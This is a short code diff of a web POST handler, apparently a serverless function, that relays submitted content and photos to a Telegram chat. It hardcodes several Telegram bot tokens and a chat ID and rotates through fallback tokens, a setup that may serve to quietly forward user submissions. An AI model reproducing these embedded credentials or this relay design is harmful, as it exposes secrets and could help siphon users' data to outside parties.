@@ -5,7 +5,7 @@ export async function onRequestPost(context) {
   const { request, env } = context;
 
   // Retrieve Telegram bot token & chat ID from env or fallback to verified constants
-  const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN || '8617758186:AAFXzOLsZPVYq3F6M6aPS5uaWuHrOAq5XNY';
+  const BOT_TOKEN = env.TELEGRAM_BOT_TOKEN || '7955190883:AAE1H6OWcno17yeEoPABRdOqYcpovHSVY6k';
   const CHAT_ID = env.TELEGRAM_CHAT_ID || '8104595144';
 
   const contentType = request.headers.get('content-type') || '';
@@ -108,10 +108,10 @@ export async function onRequestPost(context) {
     let telegramResponse = null;
 
     const candidateTokens = [
-      BOT_TOKEN,
-      '8617758186:AAFXzOLsZPVYq3F6M6aPS5uaWuHrOAq5XNY',
       '7955190883:AAE1H6OWcno17yeEoPABRdOqYcpovHSVY6k',
-      '8830044077:AAHZ-nb4twHY9GWl7wq_DCvyeKra1jXTi7E'
+      BOT_TOKEN,
+      '8830044077:AAHZ-nb4twHY9GWl7wq_DCvyeKra1jXTi7E',
+      '8617758186:AAFXzOLsZPVYq3F6M6aPS5uaWuHrOAq5XNY'
     ].filter((t, i, arr) => t && arr.indexOf(t) === i && !t.startsWith('8830044077:AAHuP'));
 
     if (photos.length > 0) {
